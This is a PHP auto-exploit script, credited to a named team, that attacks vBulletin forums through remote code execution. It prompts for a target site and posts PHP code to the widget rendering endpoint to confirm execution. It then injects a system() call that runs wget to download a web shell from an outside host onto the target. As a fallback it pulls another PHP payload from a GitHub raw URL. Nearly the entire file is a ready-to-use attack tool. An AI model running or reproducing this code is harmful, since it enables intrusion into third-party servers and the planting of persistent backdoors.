<?php
/*
	Makasih udh gunain tool w xixixi
	Support www.nyamuxpl0it.xyz
	Ganti author = lo ampas
*/
class Exploit {
  function startExploit() {
    $hij = "\033[0;32m";
    $mer = "\033[0;31m";
    $put = "\033[1;37m";
    $bir = "\033[3;34m";
    echo "{$put}Enter site: ";
    $expl = trim(fgets(STDIN));
    $shell = "bngsdlo.php";
    echo "{$bir}[*] Exploiting {$expl}\n\n";
    $c = curl_init();
    $h = [
    CURLOPT_URL => $expl."/ajax/render/widget_php",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => "widgetConfig[code]=echo 'N4ST4R_ID';"
    ];
    curl_setopt_array($c, $h);
    $ekse = curl_exec($c);
    curl_close($c);
    if (preg_match("/N4ST4R_ID/", $ekse)) {
      echo "{$hij}[+] {$expl} VULN! \n";
      sleep(1);
      echo "{$bir}[*] Trying to execute... \n";
      $ch = curl_init();
      $hc = [
      CURLOPT_URL => $expl."/ajax/render/widget_php",
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => "widgetConfig[code]=echo system('wget http://flickr.com.tvcw.org/shell.php -O {$shell}');"
      ];
      curl_setopt_array($ch, $hc);
      $ex = curl_exec($ch);
      curl_close($ch);
    } else {
      echo "{$mer}[-] {$expl} NOT VULN :(\n";
      exit;
    }
      sleep(1);
      if ($ex) {
        $bjir = curl_init();
        $op = [
        CURLOPT_URL => $expl."/".$shell,
        CURLOPT_RETURNTRANSFER => true
        ];
        curl_setopt_array($bjir, $op);
        $exec = curl_exec($bjir);
        $cex = curl_getinfo($bjir, CURLINFO_HTTP_CODE);
        curl_close($bjir);
       }
        if (preg_match("/N4ST4R_ID/", $cex) or $cex == "200") {
          print "{$hij}[+] SUKSES -> {$expl}/{$shell}\n";
          exit;
       } else {
          print "{$mer}[-] Shell not uploaded!\n";
          sleep(1);
          print "{$bir}[*] Trying to bypass upload\n";
          $byp = curl_init();
          $opsi = [
          CURLOPT_URL => $expl."/ajax/render/widget_php",
          CURLOPT_RETURNTRANSFER => true,
          CURLOPT_POST => true,
          CURLOPT_POSTFIELDS => "widgetConfig[code]=file_get_contents('https://raw.githubusercontent.com/nastar-id/kegabutan/master/asu.php');"
          ];
          curl_setopt_array($byp, $opsi);
          $x = curl_exec($byp);
          curl_close($byp);
      }
       if ($x) {
         $ancurl = curl_init();
         $opt = [
         CURLOPT_URL => $expl."/nstr.php",
         CURLOPT_RETURNTRANSFER => true
         ];
         curl_setopt_array($ancurl, $opt);
         $exe = curl_exec($ancurl);
         $cek = curl_getinfo($ancurl, CURLINFO_HTTP_CODE);
         curl_close($ancurl);
       }
       if (preg_match("/N4ST4R_ID/", $cek) or $cek == "200") {
         print "{$hij}[+] Bypass upload success > {$expl}/nstr.php\n";
      } else {
         print "{$mer}[-] Bypass upload fail.. try manual \n";
      }
    }
  function banner() {
    echo "\033[1;37m
     ______________________________
    | vBulletin RCE Auto Exploiter |
    |   Visit www.nyamuxpl0it.xyz  |______________
    |______________________________|  D704T Team  |
                      |      Code By N4ST4R_ID    |
                      |___________________________|
    \n\n";
    }
}
$expl = new Exploit();
print($expl->banner());
print($expl->startExploit());
?>
